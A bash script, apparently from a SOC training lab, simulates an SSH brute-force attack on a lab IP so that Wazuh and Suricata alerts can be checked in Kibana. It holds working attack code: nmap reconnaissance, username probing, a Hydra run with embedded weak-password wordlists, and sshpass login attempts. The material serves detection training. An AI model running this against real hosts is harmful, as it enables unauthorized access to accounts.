#!/usr/bin/env bash
# =============================================================================
# attacks/ssh_bruteforce.sh — SSH Brute Force Attack Simulation
# =============================================================================
# Simulates a real SSH brute-force attack against the target server.
# Run from the attacker container or host machine.
#
# Usage:
#   ./attacks/ssh_bruteforce.sh [TARGET_IP] [TARGET_PORT]
#
# Example:
#   ./attacks/ssh_bruteforce.sh 172.20.0.13 22
#   docker exec attacker bash /attacks/ssh_bruteforce.sh 172.20.0.13 22
# =============================================================================

set -euo pipefail

# ── Config ────────────────────────────────────────────────────────────────────
TARGET_IP="${1:-172.20.0.13}"
TARGET_PORT="${2:-22}"
WORDLIST_USERS="/tmp/users.txt"
WORDLIST_PASS="/tmp/passwords.txt"
HYDRA_THREADS=4
DELAY_BETWEEN_SCENARIOS=5

# ── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

log()    { echo -e "${CYAN}[ATTACK]${NC} $*"; }
phase()  { echo -e "\n${BOLD}${RED}━━━ $* ━━━${NC}"; }
result() { echo -e "${YELLOW}[RESULT]${NC} $*"; }

# ── Banner ────────────────────────────────────────────────────────────────────
echo -e "${BOLD}${RED}"
echo "  ╔══════════════════════════════════════════════╗"
echo "  ║    SSH BRUTE FORCE ATTACK SIMULATION         ║"
echo "  ║    FOR EDUCATIONAL / SOC TRAINING USE ONLY   ║"
echo "  ╚══════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "  Target : ${BOLD}${TARGET_IP}:${TARGET_PORT}${NC}"
echo -e "  Time   : $(date)"
echo ""

# ── Check dependencies ────────────────────────────────────────────────────────
check_deps() {
  for tool in nmap hydra ssh; do
    if ! command -v "$tool" &>/dev/null; then
      echo -e "${YELLOW}Installing $tool...${NC}"
      apt-get install -y -qq "$tool" 2>/dev/null || true
    fi
  done
}

# ── Create wordlists ──────────────────────────────────────────────────────────
create_wordlists() {
  log "Creating wordlists..."

  # Common usernames targeted in real attacks
  cat > "$WORDLIST_USERS" << 'EOF'
root
admin
ubuntu
pi
deploy
git
oracle
postgres
mysql
backup
test
user
support
nagios
jenkins
ansible
vagrant
docker
www-data
EOF

  # Common weak passwords (from real attack datasets)
  cat > "$WORDLIST_PASS" << 'EOF'
password
123456
admin
root
toor
pass
qwerty
letmein
welcome
Password1
admin123
root123
test
ubuntu
raspberry
changeme
1234567890
password123
P@ssw0rd
EOF
}

# ── Phase 1: Reconnaissance ───────────────────────────────────────────────────
phase_recon() {
  phase "PHASE 1: Reconnaissance (Service Detection)"
  log "Running service version scan on ${TARGET_IP}:${TARGET_PORT}..."

  nmap -sV -p "${TARGET_PORT}" --open -T3 "${TARGET_IP}" 2>/dev/null || {
    log "nmap not available — skipping recon phase"
    return
  }

  sleep 2
  log "SSH version detected — proceeding to banner grab..."

  # Banner grab
  timeout 5 bash -c "echo '' | nc -w3 ${TARGET_IP} ${TARGET_PORT}" 2>/dev/null | head -1 || true

  result "Recon complete. SSH service confirmed on ${TARGET_IP}:${TARGET_PORT}"
}

# ── Phase 2: User Enumeration ─────────────────────────────────────────────────
phase_user_enum() {
  phase "PHASE 2: User Enumeration"
  log "Attempting to enumerate valid usernames via timing attack..."

  local invalid_users=("fakeuser123" "notarealuser" "xyzabc999" "ghost_account")

  for user in "${invalid_users[@]}"; do
    log "Testing username: ${user}"
    timeout 3 ssh -o StrictHostKeyChecking=no \
                  -o ConnectTimeout=2 \
                  -o PasswordAuthentication=yes \
                  -p "${TARGET_PORT}" \
                  "${user}@${TARGET_IP}" exit 2>/dev/null || true
    sleep 0.5
  done

  result "User enumeration phase complete — ${#invalid_users[@]} invalid users tested"
}

# ── Phase 3: Brute Force with Hydra ──────────────────────────────────────────
phase_bruteforce() {
  phase "PHASE 3: SSH Brute Force (Hydra)"
  log "Launching Hydra brute-force attack..."
  log "Users: $(wc -l < "$WORDLIST_USERS") | Passwords: $(wc -l < "$WORDLIST_PASS")"
  log "Threads: ${HYDRA_THREADS} | Target: ${TARGET_IP}:${TARGET_PORT}"

  # Run hydra — this WILL generate Wazuh alerts
  hydra \
    -L "$WORDLIST_USERS" \
    -P "$WORDLIST_PASS" \
    -t "${HYDRA_THREADS}" \
    -s "${TARGET_PORT}" \
    -o /tmp/hydra_results.txt \
    -V \
    ssh://"${TARGET_IP}" 2>&1 | head -50 || true

  if [[ -f /tmp/hydra_results.txt ]] && [[ -s /tmp/hydra_results.txt ]]; then
    echo ""
    result "Hydra found credentials:"
    cat /tmp/hydra_results.txt
  else
    result "No valid credentials found (expected — this is a demo environment)"
  fi
}

# ── Phase 4: Manual SSH attempts ─────────────────────────────────────────────
phase_manual_attempts() {
  phase "PHASE 4: Manual SSH Connection Attempts"
  log "Simulating manual attacker trying common passwords..."

  local attempts=(
    "root:toor"
    "root:password"
    "admin:admin"
    "root:123456"
    "ubuntu:ubuntu"
    "pi:raspberry"
  )

  for attempt in "${attempts[@]}"; do
    local user="${attempt%%:*}"
    local pass="${attempt##*:}"
    log "Trying ${user}:${pass}..."

    sshpass -p "$pass" ssh \
      -o StrictHostKeyChecking=no \
      -o ConnectTimeout=2 \
      -p "${TARGET_PORT}" \
      "${user}@${TARGET_IP}" exit 2>/dev/null || true

    sleep 1
  done

  result "Manual attempt phase complete"
}

# ── Main ──────────────────────────────────────────────────────────────────────
main() {
  check_deps
  create_wordlists

  log "Attack starting against ${TARGET_IP}:${TARGET_PORT}"
  log "Monitor alerts in Kibana: http://localhost:5601"
  log "Expected alerts: SSH Brute Force (Wazuh rule 5712), Suricata SID 9000001"
  echo ""

  phase_recon
  sleep "$DELAY_BETWEEN_SCENARIOS"

  phase_user_enum
  sleep "$DELAY_BETWEEN_SCENARIOS"

  phase_bruteforce
  sleep "$DELAY_BETWEEN_SCENARIOS"

  phase_manual_attempts

  echo ""
  echo -e "${BOLD}${GREEN}"
  echo "  ╔════════════════════════════════════════════════╗"
  echo "  ║  Attack simulation complete                   ║"
  echo "  ║  Check Kibana for generated alerts            ║"
  echo "  ║  → http://localhost:5601                      ║"
  echo "  ║  → Index: wazuh-alerts-*                     ║"
  echo "  ║  → Filter: rule.id: 5712 or 5716             ║"
  echo "  ╚════════════════════════════════════════════════╝"
  echo -e "${NC}"
}

main "$@"
